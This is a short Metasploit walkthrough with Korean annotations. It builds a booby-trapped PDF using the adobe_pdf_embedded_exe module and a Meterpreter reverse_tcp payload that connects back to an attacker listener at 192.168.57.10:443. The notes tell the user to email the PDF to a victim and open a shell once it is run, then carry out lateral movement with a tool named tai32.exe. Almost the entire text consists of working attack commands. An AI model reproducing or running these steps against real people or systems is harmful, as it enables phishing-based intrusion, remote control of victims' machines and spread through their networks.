msfconsole  
msf > use exploit/windows/fileformat/adobe_pdf_embedded_exe  
msf exploit(adobe_pdf_embedded_exe) > set payload windows/meterpreter/reverse_tcp  
msf exploit(adobe_pdf_embedded_exe) > set FILENAME meterpreter.pdf  
msf exploit(adobe_pdf_embedded_exe) > set infilename (원본pdf이름)  
msf exploit(adobe_pdf_embedded_exe) > set lhost 192.168.57.10  
msf exploit(adobe_pdf_embedded_exe) > set lport 443  
msf exploit(adobe_pdf_embedded_exe) > exploit  
msf exploit(adobe_pdf_embedded_exe) > use multi/handler  
pdf를 메일로 전송   
victim에서 실행하여 악성파일 추가 생성후 대기  
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp  
msf exploit(handler) > set lhost 192.168.57.10  
msf exploit(handler) > set lport 443  
msf exploit(handler) > exploit  
meterpreter > shell  
이후 tai32.exe 등으로 측면공격 수행  
